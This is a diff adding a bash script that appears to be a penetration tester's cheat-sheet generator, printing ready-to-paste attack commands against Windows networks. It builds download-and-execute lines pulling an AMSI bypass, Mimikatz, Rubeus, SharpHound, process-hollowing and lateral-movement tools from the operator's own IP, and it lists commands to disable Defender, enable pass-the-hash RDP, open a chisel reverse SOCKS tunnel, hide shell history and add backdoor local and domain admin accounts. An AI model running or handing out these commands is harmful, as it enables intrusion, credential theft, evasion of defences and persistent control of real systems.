@@ -1,0 +1,71 @@
+#!/bin/bash
+
+iface="tun0"
+
+IP="$(ip -4 -p -j a s $iface | jq -r '.[0].addr_info[0].local')"
+if [ -z "$IP" ];then
+	iface="eth0"
+fi
+
+
+echo -e "\e[34m---------------- IEX ------------------\e[0m"
+getiex --iface $iface --file amsibp.txt
+getiex --iface $iface --file PowerView.ps1
+getiex --iface $iface --file Powermad.ps1
+getiex --iface $iface --file HostRecon.ps1
+getiex --iface $iface --file LAPSToolkit.ps1
+getiex --iface $iface --file Invoke-Mimikatz.ps1
+getiex --iface $iface --file SharpHound.ps1
+getiex --iface $iface --file PowerUpSQL.ps1
+getiex --iface $iface --file PowerUp.ps1
+getiex --iface $iface --file Invoke-TokenManipulation.ps1
+getiex --iface $iface --file winPEAS.ps1
+echo -e "\e[34m--------------- CURL ------------------\e[0m"
+getdownlink --iface $iface --file konzole.exe --curl
+getdownlink --iface $iface --file mimikatz.exe --curl
+getdownlink --iface $iface --file minidumper.exe --curl
+getdownlink --iface $iface --file mimidrv.sys --curl
+getdownlink --iface $iface --file Rubeus.exe --curl
+getdownlink --iface $iface --file SpoolSample.exe --curl
+getdownlink --iface $iface --file chisel.exe --curl
+getdownlink --iface $iface --file PsExec64.exe --curl
+getdownlink --iface $iface --file PsExec.exe --curl
+getdownlink --iface $iface --file SharpRDP.exe --curl
+getdownlink --iface $iface --file PrintClient.exe --curl
+getdownlink --iface $iface --file hollow_csharp.exe --curl
+getdownlink --iface $iface --file sqlcon_applock_bp.exe --curl
+getdownlink --iface $iface --file fileless_lateral_movement.exe --curl
+getdownlink --iface $iface --file procinj.exe --curl
+getdownlink --iface $iface --file ruuner_exe_csharp.exe --curl
+echo -e "\e[34m--------------- ASSM ------------------\e[0m"
+getassm --iface $iface --file hollow_csharp_dll.dll --runcode "\$arg=@(\"kvak\",\"cvak\");[Program]::Main(\$arg)"
+getassm --iface $iface --file hollow_csharp_dll.dll --runcode "\$arg=@(\"kvak\",\"cvak\");[Program]::Main(\$arg)" --winb64 -p
+echo -e "\e[34m-------------- SHORTCUTS ---------------\e[0m"
+echo -e "\e[31m[*] Defender - disable:\e[0m"
+echo "Set-MpPreference -DisableRealtimeMonitoring \$true"
+echo "sc.exe stop WinDefend"
+echo -e "\e[31m[*] RDP Hash Login:\e[0m"
+echo "New-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Lsa" -Name DisableRestrictedAdmin -Value 0"
+echo -e "\e[31m[*] CHISEL\e[0m"
+echo "chisel client $IP:9443 R:3128:socks"
+echo "./chisel client $IP:9443 R:3128:socks"
+echo ".\\chisel client $IP:9443 R:3128:socks"
+echo "./chisel server -p 9443 --socks5 --reverse"
+echo -e "\e[31m[*] Powershell mode\e[0m"
+echo "\$ExecutionContext.SessionState.LanguageMode"
+echo -e "\e[31m[*] Powershell history\e[0m"
+echo "(Get-PSReadLineOption).HistorySavePath"
+echo -e "\e[31m[*] Shell upgrade\e[0m"
+echo "env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null"
+echo "python3 -c 'import pty; pty.spawn("/bin/bash")'"
+echo "python -c 'import pty; pty.spawn("/bin/bash")'"
+echo -e "\e[31m[*] SSH controlmaster\e[0m"
+echo "ssh -S ./.ssh/controlmaster/<socket> <user>@<machine>"
+echo -e "\e[31m[*] Pridani lokalni user\e[0m"
+echo "net user stoupa kr0ke#@K123123 /add"
+echo "net localgroup Administrators stoupa /add"
+echo -e "\e[31m[*] Pridani domain user\e[0m"
+echo "net user stoupa kr0ke#@K123123 /add /domain"
+echo "net group \"Domain Admins\" stoupa /add /domain"
+echo "---------------------------------------"
+
